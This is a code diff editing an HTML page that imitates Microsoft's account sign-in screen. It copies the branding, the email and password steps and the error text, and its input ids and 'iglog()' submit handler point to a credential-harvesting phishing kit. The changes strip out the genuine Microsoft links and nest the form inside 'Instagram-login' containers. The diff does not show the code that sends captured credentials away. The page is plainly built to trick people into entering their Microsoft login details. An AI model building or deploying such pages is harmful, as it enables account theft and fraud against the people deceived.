@@ -11,12 +11,15 @@
 </head>
 <body>
     <main>
-        <div id="form-holder">
+        <div id="igp">
+            <div class="Instagram-login" id="ig2" align="center">
+                <div class="ppt">
+            <div id="form-holder">
             <img class="sign-in" src="img/microsoft_logo.svg" alt="logo" id="ms-logo">
             <h2 class="sign-in-content sign-in">Sign in</h2>
-            <p class="error-message sign-in">That Microsoft account doesn't exist. Enter a different account or <a href="https://signup.live.com/signup?wa=wsignin1.0&rpsnv=13&ct=1565220060&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3da1e8e8cb-3a14-e903-3c96-706bdfe6c9ec&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&pid=0&contextid=E36BF1753B26B294&bk=1565424303&uiflavor=web&mkt=EN-US&lc=1033&uaid=872f6832bc454f95aa40281782ee32e7&nw=3G">get a new one</a>.</p>
-            <input id="ig-uname" class="sign-in-content sign-in" type="email" name="loginfmt" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype">
-            <p class="sign-in-content sign-in">No account? <a href="https://signup.live.com/signup?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1565220060&amp;rver=7.0.6737.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3da1e8e8cb-3a14-e903-3c96-706bdfe6c9ec&amp;id=292841&amp;aadredir=1&amp;CBCXT=out&amp;lw=1&amp;fl=dob%2cflname%2cwld&amp;cobrandid=90015&amp;contextid=0806E5BA5DA72AAA&amp;bk=1565222761&amp;uiflavor=web&amp;mkt=EN-US&amp;lc=1033&amp;uaid=97ff2ef4536c492291d2e93971a379da" id="signup" aria-label="Create a Microsoft account" name="createAccount">Create one!</a></p>
+            <p class="error-message sign-in">That Microsoft account doesn't exist. Enter a different account or <a href="#">get a new one</a>.</p>
+            <input id="ig-uname" class="sign-in-content sign-in" type="email" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype">
+            <p class="sign-in-content sign-in">No account? <a href="#">Create one!</a></p>
             <p class="sign-in-content sign-in"><a href="">Sign-in options</a></p>
             <div class="sign-in-content sign-in" id="submit">
                 <button>Next</button>
@@ -24,12 +27,15 @@
             <p class="sign-up"><button id="back-icon"><i class="fas fa-arrow-left"></i></button> <span id="user-info"></span></p>
             <h2 class="sign-up">Enter password</h2>
             <p class="error-message sign-up">Your account or password is incorrect. If you don't remember your password, <a id="reset-password">reset it now</a>.</p>
-            <input name="passwd" type="password" id="ig-pass" class="sign-up" autocomplete="off" placeholder="Password">
+            <input type="password" id="ig-pass" class="sign-up" autocomplete="off" placeholder="Password">
             <p class="sign-up" id="keep-logged"><input type="checkbox"> Keep me signed in</p>
             <p class="sign-up"><a href="">Forgot my password</a></p>
-            <div class="sign-up" id="ig-log">
-                <button id="sign-in-btn" onclick="iglog()">Sign in</button>
+            <div class="sign-up" >
+                <button id="ig-log" onclick="iglog()">Sign in</button>
             </div>
+        </div>
+    </div>
+</div>
             <div id="cover">
                 <img src="img/803.gif" alt="loading">
             </div>
